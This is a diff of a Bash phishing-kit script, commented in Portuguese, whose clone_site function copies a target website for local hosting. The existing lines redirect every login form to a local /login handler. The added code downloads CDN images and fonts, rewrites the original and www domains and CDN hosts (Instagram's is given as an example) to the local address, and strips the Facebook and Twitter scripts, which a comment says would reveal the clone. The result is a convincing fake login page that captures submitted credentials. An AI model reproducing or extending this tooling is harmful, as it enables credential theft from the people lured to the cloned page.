@@ -146,13 +146,51 @@ clone_site() {
     sed -i 's/action="[^"]*"/action="\/login"/gI' "$SITE_DIR/index.html"
     # Garantir method POST
     sed -i 's/<form\b/<form method="POST" action="\/login"/gI' "$SITE_DIR/index.html"
+    # Extrair domínios do site pra trocar todos
+    local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
+    local domain_www="www.${domain_plain}"
+
+    # 3.5 Baixar recursos do CDN (imagens, fonts, webp)
+    echo -e "${YELLOW}[3.5] Baixando recursos do CDN...${NC}"
+    local asset_count=0
+    # Extrair URLs de imagens/assets do HTML e baixar
+    grep -oE '(src|href|url)\s*[=\(]\s*"https://[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null > "$SCRIPT_DIR/.assets_list"
+    # Também do CSS
+    for css_file in "$SITE_DIR"/css_*.css; do
+        [ -f "$css_file" ] || continue
+        grep -oE 'url\(https://[^)]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\)' "$css_file" 2>/dev/null | sed 's|url(//;s|).*||' >> "$SCRIPT_DIR/.assets_list"
+    done
+    sort -u "$SCRIPT_DIR/.assets_list" > "$SCRIPT_DIR/.assets_list_sorted"
+    while IFS= read -r asset_url; do
+        asset_url=$(echo "$asset_url" | sed 's|"||g')
+        [ -z "$asset_url" ] && continue
+        local asset_file="asset_${asset_count}_$(basename "$asset_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
+        $curl_cmd -s -o "$SITE_DIR/$asset_file" "$asset_url" >> "$SCRIPT_DIR/curl.log" 2>&1
+        asset_count=$((asset_count + 1))
+    done < "$SCRIPT_DIR/.assets_list_sorted"
+    rm -f "$SCRIPT_DIR/.assets_list" "$SCRIPT_DIR/.assets_list_sorted"
+    echo -e "${GREEN}  → ${asset_count} assets baixados${NC}"
+
     # Trocar URLs do domínio original pelo IP local
     sed -i "s|${base_domain}|${local_url}|gI" "$SITE_DIR/index.html"
-    # Trocar qualquer https:// ou http:// que sobrou do domínio (segurança)
-    local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
+    # Trocar www.dominio.com e dominio.com
     sed -i "s|https\?://${domain_plain}|${local_url}|gI" "$SITE_DIR/index.html"
+    sed -i "s|https\?://${domain_www}|${local_url}|gI" "$SITE_DIR/index.html"
     # Corrigir URLs no estilo (url(...) que apontam pro domínio)
     sed -i "s|url(${domain_plain}|url(${local_url}|gI" "$SITE_DIR/index.html"
+    sed -i "s|url(${domain_www}|url(${local_url}|gI" "$SITE_DIR/index.html"
+    # Trocar CDN (ex: static.cdninstagram.com, cdn.site.com)
+    local cdn_domains=$(grep -oE 'https://[^./]+\.[^./]+\.com' "$SITE_DIR/index.html" 2>/dev/null | sort -u)
+    for cdn in $cdn_domains; do
+        local cdn_host=$(echo "$cdn" | sed 's|https\?://||')
+        local cdn_escaped=$(echo "$cdn_host" | sed 's/[.[\*^$(){}?+|/]/\\&/g')
+        sed -i "s|https\?://${cdn_escaped}|${local_url}|gI" "$SITE_DIR/index.html"
+        # Trocar também nos CSS
+        for css_file in "$SITE_DIR"/css_*.css; do
+            [ -f "$css_file" ] || continue
+            sed -i "s|https\?://${cdn_escaped}|${local_url}|gI" "$css_file"
+        done
+    done
     # Remover integrações externas que denunciam clone
     sed -i 's/<script[^>]*src="https:\/\/connect\.facebook\.net[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
     sed -i 's/<script[^>]*src="https:\/\/platform\.twitter\.com[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
